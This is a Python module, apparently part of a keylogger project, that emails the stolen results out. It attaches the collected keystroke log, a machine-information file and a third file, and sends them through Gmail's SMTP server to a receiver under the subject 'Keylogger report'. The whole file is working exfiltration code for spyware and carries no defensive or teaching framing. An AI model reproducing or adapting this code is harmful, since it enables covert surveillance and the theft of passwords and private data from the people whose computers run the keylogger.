# email_sender.py
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Send the information by mail 
def send_email(filename3, sender_email, receiver_email, password):
    port = 465  # For SSL
    body = "A report for the keylogger"
    
    smtp_server = "smtp.gmail.com"
   
   # Creating a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Keylogger report"

    # The text to be sent
    message.attach(MIMEText(body, "plain"))

    filename1 = "log_collected.txt"
    filename2 = "machine_infos.txt"

    # Open files in binary mode
    with open(filename1, "rb") as attachment1, open(filename2, "rb") as attachment2, open(filename3, "rb") as attachment3:
        # Add files as application/octet-stream
        # Email client can usually download this automatically as attachment
        part1 = MIMEBase("application", "octet-stream")
        part1.set_payload(attachment1.read())

        part2 = MIMEBase("application", "octet-stream")
        part2.set_payload(attachment2.read())

        part3 = MIMEBase("application", "octet-stream")
        part3.set_payload(attachment3.read())

    # Encode files in ASCII characters to send by email
    encoders.encode_base64(part1)
    encoders.encode_base64(part2)
    encoders.encode_base64(part3)

    # Add header as key/value pair to attachment parts
    part1.add_header("Content-Disposition", "attachment", filename=filename1)
    part2.add_header("Content-Disposition", "attachment", filename=filename2)
    part3.add_header("Content-Disposition", "attachment", filename=filename3)

    # Add attachments to message
    message.attach(part1)
    message.attach(part2)
    message.attach(part3)

    text = message.as_string()

    try:
        # Create a secure SSL context
        context = ssl.create_default_context()
        
        # Connect and send email using SSL
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)

        print("Mail has been sent successfully to", receiver_email, "\n")

    except Exception as e:
        print("\n An error occurred while sending the email:", e)


